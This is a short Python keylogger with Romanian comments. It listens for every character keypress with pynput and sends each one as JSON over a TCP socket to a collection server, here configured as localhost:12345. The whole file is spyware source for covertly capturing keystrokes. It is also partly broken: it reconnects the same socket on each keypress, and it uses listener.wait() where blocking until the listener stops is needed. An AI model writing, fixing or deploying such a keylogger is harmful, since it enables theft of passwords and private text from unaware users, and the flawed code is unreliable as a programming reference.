from pynput import keyboard
import socket
import json

class KeyLogger:
    def __init__(self):
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_address = ('localhost', 12345)

    def send_data_to_server(self, data):
        try:
            self.client_socket.connect(self.server_address)
            json_data = json.dumps(data)
            self.client_socket.sendall(json_data.encode())

        except Exception as e:
            print(f"Eroare la trimiterea datelor catre server: {str(e)}")

    def on_key_press(self, key):
        try:
            char = key.char
            data = {'key': char}
            self.send_data_to_server(data)

        except AttributeError:
            # Tasta apăsată nu este un caracter (posibil o tastă specială)
            pass

    def start_logging(self):
        listener = keyboard.Listener(on_press=self.on_key_press)
        listener.start()

        # Păstrează programul activ până când este oprit manual
        try:
            listener.wait()

        except KeyboardInterrupt:
            # Oprește programul când se apasă CTRL+C
            self.client_socket.close()

if __name__ == "__main__":
    logger = KeyLogger()
    logger.start_logging()
